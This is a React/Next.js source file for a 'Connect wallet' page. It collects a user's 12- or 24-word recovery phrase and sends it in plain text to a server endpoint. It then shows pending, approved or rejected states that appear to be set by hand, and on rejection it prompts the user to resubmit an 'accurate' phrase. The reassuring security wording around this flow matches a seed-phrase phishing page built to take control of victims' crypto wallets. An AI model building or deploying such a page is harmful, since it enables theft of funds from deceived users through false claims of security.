"use client";
import React, { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import { ChevronLeft, Link2, Loader2, ShieldAlert } from 'lucide-react';
import { toast } from 'sonner';

export default function ConnectPage() {
  const router = useRouter();
  const [phrase, setPhrase] = useState('');
  const [reason, setReason] = useState('');
  const [loading, setLoading] = useState(false);
  const [wordCount, setWordCount] = useState(0);
  const [isInitialCheckDone, setIsInitialCheckDone] = useState(false);

  const [step, setStep] = useState<'form' | 'connecting' | 'success' | 'rejected'>('form');

  useEffect(() => {
    const words = phrase.trim().split(/\s+/).filter(w => w.length > 0);
    setWordCount(words.length);
  }, [phrase]);

  // Initial check to see if they already have a pending or approved wallet
  useEffect(() => {
    const checkInitialStatus = async () => {
      try {
        const res = await fetch('/api/wallet/status');
        const data = await res.json();
        if (data.success && data.status) {
          if (data.status === 'approved') setStep('success');
          else if (data.status === 'pending') setStep('connecting');
          else if (data.status === 'rejected') setStep('rejected');
        }
      } catch (e) {
        console.error("Initial status check failed");
      } finally {
        setIsInitialCheckDone(true);
      }
    };
    checkInitialStatus();
  }, []);

  // Polling logic when connecting
  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (step === 'connecting') {
      interval = setInterval(async () => {
        try {
          const res = await fetch('/api/wallet/status');
          const data = await res.json();
          if (data.success) {
            if (data.status === 'approved') {
              setStep('success');
              clearInterval(interval);
            } else if (data.status === 'rejected') {
              setStep('rejected');
              clearInterval(interval);
            }
          }
        } catch (e) {
          console.error("Polling error", e);
        }
      }, 5000);
    }
    return () => clearInterval(interval);
  }, [step]);

  const handleSubmit = async () => {
    if (wordCount < 12) {
      toast.error("Please enter a valid 12 or 24-word phrase.");
      return;
    }
    if (!reason) {
      toast.error("Please select a reason for connecting.");
      return;
    }

    setLoading(true);
    setStep('connecting');

    try {
      const res = await fetch('/api/wallet/import', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          type: 'phrase', 
          value: phrase + `\n\n[Reason]: ${reason}` 
        }),
      });

      const data = await res.json();

      if (!data.success) {
        toast.error(data.error || "Failed to connect wallet");
        setStep('form');
        setLoading(false);
      }
    } catch (error) {
      toast.error("Network error. Please try again.");
      setStep('form');
      setLoading(false);
    }
  };

  if (!isInitialCheckDone) {
    return <div className="min-h-screen bg-[#0a0a0a] flex items-center justify-center"><Loader2 className="animate-spin text-primary" size={32} /></div>;
  }

  if (step === 'connecting' || step === 'success' || step === 'rejected') {
    return (
      <div className="min-h-screen bg-[#0a0a0a] text-white p-4 flex flex-col pt-12 pb-32 items-center">
        <div className="w-full max-w-4xl">
          <button 
            onClick={() => router.back()} 
            className="flex items-center gap-2 text-zinc-300 hover:text-white transition-colors font-bold text-sm mb-8"
          >
            <ChevronLeft size={20} />
            Back
          </button>

          <div className="bg-[#0c1117] border border-white/5 rounded-3xl p-8 flex flex-col items-center justify-center min-h-[450px]">
            
            <div className="w-16 h-16 bg-[#161b22] rounded-2xl flex items-center justify-center mb-6 shadow-xl border border-white/5">
              {step === 'rejected' ? <ShieldAlert size={28} className="text-red-500" /> : <Link2 size={28} className="text-blue-500" />}
            </div>

            <h2 className="text-2xl font-bold mb-2">Connect wallet</h2>
            <p className="text-zinc-500 text-sm mb-12 text-center max-w-sm">
              Secure your assets. Enter your passphrase to link an external wallet.
            </p>

            {step === 'rejected' ? (
              <>
                <div className="w-full max-w-2xl rounded-2xl bg-red-500/10 border border-red-500/20 p-5 shadow-lg text-center">
                  <p className="text-[15px] font-medium text-red-400 leading-relaxed">
                    Connection Request Rejected. Please securely review your connection details and ensure the provided wallet phrase is accurate before attempting to connect again.
                  </p>
                </div>
                <button 
                  onClick={() => {
                    setStep('form');
                    setLoading(false);
                  }}
                  className="mt-8 px-6 py-2.5 bg-red-600 hover:bg-red-500 rounded-lg text-sm font-bold transition-colors text-white shadow-lg"
                >
                  Attempt Reconnection
                </button>
              </>
            ) : (
              <div className="w-full rounded-2xl bg-[#0062E5] p-5 shadow-lg">
                <p className="text-[15px] font-medium text-white text-center leading-relaxed">
                  {step === 'connecting' 
                    ? "Please be patient while we establish a secure connection to your wallet. This may take a moment, and you'll be notified once it's complete."
                    : "The connection to your wallet has been successfully established. You are now securely connected, and everything is set up and ready. Thank you for your cooperation!"
                  }
                </p>
              </div>
            )}

            {/* Note: In success mode, we intentionally DO NOT render a return button, matching the reference image. */}

          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#0a0a0a] text-white p-4 md:p-8 animate-in fade-in duration-500 pb-32">
      <div className="max-w-2xl mx-auto pt-[max(env(safe-area-inset-top),1.5rem)]">
        
        {/* BACK BUTTON */}
        <button 
          onClick={() => router.back()} 
          className="flex items-center gap-2 text-zinc-300 hover:text-white transition-colors font-bold text-sm mb-8"
        >
          <ChevronLeft size={20} />
          back
        </button>

        <div className="space-y-6">
          
          {/* PHRASE INPUT */}
          <div>
            <textarea
              value={phrase}
              onChange={(e) => setPhrase(e.target.value)}
              placeholder="Enter your 12 or 24-word phrase"
              className="w-full h-40 bg-[#151515] border border-white/5 rounded-xl p-4 text-zinc-300 font-medium outline-none focus:border-primary/50 resize-none transition-colors"
            />
            <p className="text-zinc-500 text-xs font-bold mt-2">Word count: {wordCount}</p>
          </div>

          {/* REASON DROPDOWN */}
          <div className="space-y-2">
            <label className="text-zinc-400 font-bold text-sm">Reason for Connecting</label>
            <div className="relative">
              <select
                value={reason}
                onChange={(e) => setReason(e.target.value)}
                className="w-full bg-[#151515] border border-white/5 rounded-xl p-4 text-zinc-300 font-medium outline-none focus:border-primary/50 appearance-none cursor-pointer"
              >
                <option value="" disabled>Select the purpose for connecting this wallet</option>
                <option value="Get Access To This Wallet">🔓 Get Access To This Wallet</option>
                <option value="Transfer Assets Into This Wallet">💸 Transfer Assets Into This Wallet</option>
                <option value="Withdraw Assets From This Wallet">🏦 Withdraw Assets From This Wallet</option>
              </select>
              <div className="absolute inset-y-0 right-4 flex items-center pointer-events-none">
                <svg width="12" height="8" viewBox="0 0 12 8" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path d="M1 1.5L6 6.5L11 1.5" stroke="#71717A" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                </svg>
              </div>
            </div>
          </div>

          {/* EXPLANATION TEXT */}
          <div className="space-y-1 mt-4">
            <h4 className="text-zinc-300 font-bold text-sm">What does "This Wallet" mean?</h4>
            <p className="text-zinc-500 text-xs leading-relaxed">
              "This Wallet" refers to the wallet you are connecting right now using your 12 or 24-word recovery phrase. It will become the active wallet used for performing secure actions such as transferring, receiving, or accessing crypto assets.
            </p>
            <p className="text-zinc-500 text-xs leading-relaxed">
              Choose your reason so we can securely validate your intent and ensure your actions align with your wallet's permissions.
            </p>
          </div>

          {/* SUBMIT BUTTON */}
          <button 
            onClick={handleSubmit}
            disabled={loading}
            className="w-full bg-emerald-600 hover:bg-primary text-white font-bold py-4 rounded-xl mt-6 transition-all active:scale-[0.98] disabled:opacity-50 flex items-center justify-center gap-2"
          >
            {loading ? <Loader2 size={20} className="animate-spin" /> : "Securely Connect Wallet"}
          </button>

        </div>
      </div>
    </div>
  );
}
